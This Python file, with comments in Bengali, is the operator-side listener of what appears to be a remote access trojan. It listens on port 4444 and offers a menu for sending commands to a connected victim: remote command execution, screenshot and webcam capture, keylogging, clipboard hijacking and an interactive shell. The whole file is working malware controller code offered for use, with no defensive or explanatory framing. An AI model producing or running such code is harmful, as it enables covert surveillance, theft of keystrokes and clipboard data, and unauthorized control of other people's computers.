import socket
import colorama
from colorama import Fore, Style

# Colorama ইনিশিয়ালাইজ করা
colorama.init()

def start_listener(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(1)
    print(Fore.CYAN + f"[*] Listening on {ip}:{port}" + Style.RESET_ALL)

    client, addr = server.accept()
    print(Fore.CYAN + f"[+] Connection received from {addr}" + Style.RESET_ALL)

    while True:
        print(Fore.CYAN + "\n[1] Run Commands\n[2] Capture Screenshot\n[3] Capture Webcam\n[4] Start Keylogger\n[5] View Keylog File\n[6] Clipboard Hijacking\n[7] Open Shell\n[8] Exit" + Style.RESET_ALL)
        choice = input(Fore.CYAN + "Select Option: " + Style.RESET_ALL)

        if choice == "1":
            cmd = input(Fore.CYAN + "Shell> " + Style.RESET_ALL)
            client.send(cmd.encode())
            output = client.recv(4096).decode()
            print(Fore.RED + output + Style.RESET_ALL)  # Output Red color-এ

        elif choice == "2":
            client.send(b"screenshot")
            print(Fore.CYAN + "[+] Screenshot Command Sent!" + Style.RESET_ALL)

        elif choice == "3":
            client.send(b"webcam")
            print(Fore.CYAN + "[+] Webcam Capture Command Sent!" + Style.RESET_ALL)

        elif choice == "4":
            client.send(b"keylog")
            print(Fore.CYAN + "[+] Keylogger Started!" + Style.RESET_ALL)

        elif choice == "5":
            print(Fore.CYAN + "\n[+] Keylog File Contents:" + Style.RESET_ALL)
            try:
                with open("keylog.txt", "r") as file:
                    print(Fore.RED + file.read() + Style.RESET_ALL)  # File content Red
            except FileNotFoundError:
                print(Fore.RED + "[-] Keylog file not found!" + Style.RESET_ALL)

        elif choice == "6":
            client.send(b"clipboard")
            clipboard_data = client.recv(4096).decode()
            print(Fore.CYAN + "\n[+] Clipboard Data:\n" + Fore.RED + clipboard_data + Style.RESET_ALL)

        elif choice == "7":
            client.send(b"shell")
            print(Fore.CYAN + "[+] Entering Shell Mode (Type 'exit_shell' to return)" + Style.RESET_ALL)
            while True:
                cmd = input(Fore.CYAN + "Shell> " + Style.RESET_ALL)
                client.send(cmd.encode())
                if cmd.lower() == "exit_shell":
                    break
                output = client.recv(4096).decode()
                print(Fore.RED + output + Style.RESET_ALL)  # Shell output Red

        elif choice == "8":
            client.send(b"exit")
            break

    client.close()
    server.close()

if __name__ == "__main__":
    start_listener("0.0.0.0", 4444)  # IP পরিবর্তন করতে পারেন
